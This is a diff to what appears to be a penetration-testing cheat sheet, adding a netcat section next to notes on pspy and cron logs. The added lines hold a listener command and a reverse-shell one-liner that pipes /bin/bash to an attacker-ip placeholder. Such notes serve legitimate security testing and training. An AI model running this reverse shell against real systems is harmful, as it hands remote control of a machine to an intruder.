@@ -1585,7 +1585,11 @@ pspy #handy tool to livemonitor stuff happening in Linux
 
 grep "CRON" /var/log/syslog #inspecting cron logs
 ```
-
+## NC Netcat
+```bash
+nc -nlvp <port> 
+nc <attacker-ip> <port> -e /bin/bash
+```
 ## NFS
 
 ```bash
